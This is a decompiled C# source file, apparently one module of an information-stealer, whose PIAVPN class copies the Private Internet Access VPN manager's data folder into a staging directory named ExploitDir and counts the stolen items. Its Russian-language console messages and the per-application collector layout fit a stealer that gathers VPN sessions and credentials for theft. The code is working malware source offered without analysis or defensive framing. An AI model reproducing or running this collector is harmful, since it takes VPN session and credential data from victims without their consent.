﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200006D RID: 109
	internal class PIAVPN
	{
		// Token: 0x0600024E RID: 590 RVA: 0x0000EB30 File Offset: 0x0000CD30
		public static void SaveFileSession()
		{
			string path = Help.CommonData + "\\pia_manager";
			string text = Help.ExploitDir + "\\VPN\\PIA (Private Internet Access) VPN";
			if (!Directory.Exists(path))
			{
				Console.WriteLine("Исходная директория не существует.");
				return;
			}
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			foreach (string text2 in Directory.GetFiles(path))
			{
				string fileName = Path.GetFileName(text2);
				string destFileName = Path.Combine(text, fileName);
				File.Copy(text2, destFileName, true);
				Console.WriteLine("Файл " + fileName + " скопирован успешно.");
				Counting.pia++;
			}
			foreach (string text3 in Directory.GetDirectories(path))
			{
				string fileName2 = Path.GetFileName(text3);
				string text4 = Path.Combine(text, fileName2);
				Directory.CreateDirectory(text4);
				PIAVPN.CopyDirectory(text3, text4);
				Counting.pia++;
			}
			Console.WriteLine("Копирование завершено.");
		}

		// Token: 0x0600024F RID: 591 RVA: 0x0000EC24 File Offset: 0x0000CE24
		private static void CopyDirectory(string sourceDirectory, string targetDirectory)
		{
			foreach (string text in Directory.GetFiles(sourceDirectory))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(targetDirectory, fileName);
				File.Copy(text, destFileName, true);
				Console.WriteLine("Файл " + fileName + " скопирован успешно.");
			}
			foreach (string text2 in Directory.GetDirectories(sourceDirectory))
			{
				string fileName2 = Path.GetFileName(text2);
				string text3 = Path.Combine(targetDirectory, fileName2);
				Directory.CreateDirectory(text3);
				PIAVPN.CopyDirectory(text2, text3);
			}
		}
	}
}
